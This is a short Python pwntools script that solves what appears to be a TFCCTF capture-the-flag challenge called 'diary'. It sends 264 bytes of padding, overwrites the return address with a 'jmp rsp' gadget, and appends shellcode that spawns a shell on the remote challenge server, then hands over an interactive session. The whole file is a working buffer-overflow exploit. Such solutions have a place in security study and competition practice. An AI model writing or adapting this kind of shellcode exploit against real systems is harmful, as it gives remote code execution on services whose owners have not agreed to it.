#!/usr/bin/env python3

from pwn import *

exe = ELF("./diary_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("challs.tfcctf.com", 30693)

    return r

"""
0x000000000040114a : jmp rsp
"""

def main():
    r = conn()
    
    # good luck pwning :)
    offset = 264
    payload = b"a"*offset + flat(0x40114a) + asm(shellcraft.sh())
    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
